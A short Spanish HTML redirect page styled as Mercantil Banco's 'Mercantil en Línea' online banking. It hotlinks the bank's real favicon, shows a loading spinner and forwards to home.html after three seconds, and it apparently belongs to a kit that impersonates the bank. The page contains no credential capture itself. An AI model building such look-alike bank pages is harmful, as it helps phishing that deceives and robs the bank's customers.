<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercantil en Línea</title>
    <link rel="shortcut icon" href="https://www30.mercantilbanco.com/favicon.ico" type="image/x-icon">

    <script>
        setTimeout(function() { window.location.replace('home.html'); }, 3000);
    </script>

    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: Arial, sans-serif;
            background: #eff3f8;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .nav-bar {
            background: #004e9b;
            height: 64px;
            position: fixed;
            top: 0; left: 0; right: 0;
            display: flex;
            align-items: center;
            padding: 0 24px;
            z-index: 100;
        }
        .nav-bar img { height: 36px; width: auto; }

        .main {
            flex: 1;
            margin-top: 64px;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .card {
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 4px 24px rgba(0,0,0,.1);
            padding: 48px 36px 40px;
            width: 100%;
            max-width: 380px;
            text-align: center;
        }

        .spinner {
            width: 52px;
            height: 52px;
            border: 4px solid #d6e6f5;
            border-top-color: #004e9b;
            border-radius: 50%;
            animation: spin 0.85s linear infinite;
            margin: 0 auto 28px;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .card-title {
            color: #004e9b;
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .card-sub {
            color: #888;
            font-size: 13px;
            margin-bottom: 28px;
        }

        .progress-track {
            background: #e0e0e0;
            border-radius: 4px;
            height: 5px;
            overflow: hidden;
        }
        #progressBar {
            height: 100%;
            width: 0%;
            background: #004e9b;
            border-radius: 4px;
            transition: width 3s linear;
        }

        footer {
            background: #fff;
            border-top: 1px solid #e0e0e0;
            padding: 14px 24px;
            text-align: center;
            font-size: 12px;
            color: #757575;
        }
    </style>
</head>
<body>

<nav class="nav-bar">
    <img src="containersito/Log.png" alt="Mercantil en Línea">
</nav>

<div class="main">
    <div class="card">
        <div class="spinner"></div>
        <div class="card-title">Redirigiendo...</div>
        <div class="card-sub">Por favor espera un momento.</div>
        <div class="progress-track">
            <div id="progressBar"></div>
        </div>
    </div>
</div>

<footer>
    <span>Derechos protegidos por Mercantil C.A., Universal. RIF: J-00002961-0.</span>
</footer>

<script>
    requestAnimationFrame(function() {
        requestAnimationFrame(function() {
            document.getElementById('progressBar').style.width = '100%';
        });
    });
</script>

</body>
</html>
